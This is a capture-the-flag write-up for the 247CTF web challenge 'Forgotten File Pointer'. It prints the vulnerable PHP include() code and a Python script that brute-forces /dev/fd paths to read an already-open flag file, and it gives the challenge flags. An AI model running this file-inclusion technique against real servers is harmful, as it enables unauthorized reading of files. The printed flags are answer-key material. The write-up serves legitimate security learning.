# Web: Forgotten File Pointer

## Previous Flag
```
247CTF{df766362b470d11495214b2f8a4a31b3}
```

## Goal
We have opened the flag, but forgot to read and print it. Can you access it anyway?

## What I learned
```
https://734c7c3971218830.247ctf.com/index.php?include=/tmp/flag.txt       strlen(/tmp/flag.txt) > 10
https://734c7c3971218830.247ctf.com/?include=/tmp/flag.txt                strlen(/tmp/flag.txt) > 10

# Access file pointer via process id of php, but we not know              <?php
https://734c7c3971218830.247ctf.com/?include=/proc/????                   echo "My PID: " . getmypid() . PHP_EOL;
Google: php bug: https://bugs.php.net/
  /dev/fd/?
```

## Solution
```
START CHALLENGE

https://734c7c3971218830.247ctf.com/

<?php
  $fp = fopen("/tmp/flag.txt", "r");                        // assign file pointer to $fp

  // If request is a GET and 'include' parameter exists and is shorter than 11:
  if($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['include']) && strlen($_GET['include']) <= 10) {
    // include() will evaluate/execute the PHP code in the specified path (or load the file contents)
    // In PHP, include() can load local files and some stream-wrappers (php://, data://)
    include($_GET['include']);
  }
  fclose($fp);
  // highlight_file() returns or prints source code of this file with HTML markup
  // highlight_file(__FILE__, true) returns the highlighted source as a string; echo prints it
  echo highlight_file(__FILE__, true);
?>

# Method 1: Manual Brute Force
Browser: https://734c7c3971218830.247ctf.com/?include=/dev/fd/10 ⌨️
247CTF{4be4e08685e2ed433dde9171e887761e} 🔐<?php
  $fp = fopen("/tmp/flag.txt", "r");
  if($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['include']) && strlen($_GET['include']) <= 10) {
    include($_GET['include']);
  }
  fclose($fp);
  echo highlight_file(__FILE__, true);
?>

# Method 2:
AsianHacker-picoctf@webshell:~$ vi pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ chmod u+x pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
#!/usr/bin/python3
import requests                     # HTTP library for making GET requests

# NOTE: On Linux, open file descriptors are exposed as symlinks under paths like
# '/proc/self/fd/<n>' and '/dev/fd/<n>'. If a process has /tmp/flag.txt opened,
# one of those numeric FDs may point to it. This script tries to "include" those
# fd paths via the vulnerable web endpoint to read the flag.
ctf_url = "https://734c7c3971218830.247ctf.com"

print("Bruteforcing file descriptors to find open flag.txt file...")

# Try file descriptor numbers 0..99
for i in range(100):
    # Build a GET request with a query parameter include=/dev/fd/<i>
    # requests.get accepts a sequence of (key, value) tuples as the second
    # positional argument which is treated as the query string (params).
    # Equivalent and clearer: requests.get(ctf_url, params={"include": f"/dev/fd/{i}"})
    resp = requests.get(f"{ctf_url}", [("include", f"/dev/fd/{i}")])

    # Search the HTTP response body for the expected flag prefix
    flag_start = resp.text.find("247CTF{")

    # If we found the prefix, locate the closing brace and print the whole flag
    if flag_start != -1:
        flag_end = resp.text.find("}", flag_start)   # find the end of the flag
        print(f"Found flag through file descriptor '{i}':", resp.text[flag_start:flag_end + 1])
        break  # stop once we found a flag

# The `for` loop has an `else` that runs only if the loop completes with NO break
else:
    print("Failed to find open file descriptor!")

AsianHacker-picoctf@webshell:~$ ./pythonScript.py ⌨️
Bruteforcing file descriptors to find open flag.txt file...
Found flag through file descriptor '10': 247CTF{4be4e08685e2ed433dde9171e887761e} 🔐
```

## Flag
247CTF{4be4e08685e2ed433dde9171e887761e}

## Continue
[Continue](../247ctf/WebAcidFlagBank.md)